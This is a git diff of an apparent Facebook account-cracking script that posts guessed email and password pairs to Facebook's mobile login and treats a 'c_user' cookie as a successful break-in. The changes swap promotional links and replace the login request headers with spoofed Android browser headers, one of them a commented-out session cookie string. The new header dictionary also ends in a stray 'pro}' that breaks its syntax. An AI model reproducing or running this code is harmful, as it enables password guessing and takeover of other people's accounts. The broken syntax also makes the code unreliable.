@@ -89,7 +89,7 @@ for ua in range(10000):
 	h='Mobile Safari/537.36'
 	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
 	ugen.append(alhhaj)
-os.system("xdg-open https://t.me/JAVA_SCIPT_KING")
+os.system("xdg-open https://github.com/safwangaiming11")
 logo =("""                        \033[1;31m𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐖𝐎𝐑𝐋𝐃 ♚
 
  $$$$$$\   $$$$$$\  $$$$$$$$\ $$\      $$\  $$$$$$\  $$\   $$\ 
@@ -127,9 +127,9 @@ def Jaber():
     if Jaber in ["1","A"]:
         Jabers()
     if Jaber in ["2","B"]:
-        os.system('xdg-open https://facebook.com/groups/544684501030088/')
+        os.system('xdg-open https://facebook.com/groups/627578409453077/')
     if Jaber in ["3","C"]:
-        os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100028392141273')
     if Jaber in ["0","X"]:
         os.system('exit')
 
@@ -194,26 +194,32 @@ def Jaberm(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro}
+            header_freefb = {
+    'authority': 'x.facebook.com',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'dbln=%7B%2261552288777361%22%3A%22VW7re11M%22%2C%2261552563442460%22%3A%228FwUGMeR%22%2C%2261552553341339%22%3A%22YgOKovZB%22%2C%2261552001685620%22%3A%22fG2tyNt2%22%7D; datr=IcFTZep9YN9J039NqgMd_EUZ; sb=IcFTZaHSUWUhJqRFdn65qsSO; locale=en_GB; vpd=v1%3B720x393x2.75; wl_cbv=v2%3Bclient_version%3A2360%3Btimestamp%3A1700166460; m_pixel_ratio=2.75; wd=393x720; fr=0xtTNFYytGM0hdHTr.AWWGn6mjNGco_bEFwN8XH1PlELU.BlU8Eh.ST.AAA.0.0.BlWbDh.AWUarpOvFaU',
+    'dpr': '2.75',
+    'origin': 'https://x.facebook.com',
+    'referer': 'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"M2010J19SG"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"12.0.0"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '393',
+    'x-asbd-id': '129477',
+    'x-fb-lsd': 'AVpXk-DO5uY',
+    'x-requested-with': 'XMLHttpRequest',
+    'x-response-format': 'JSONStream',
+pro}
             lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
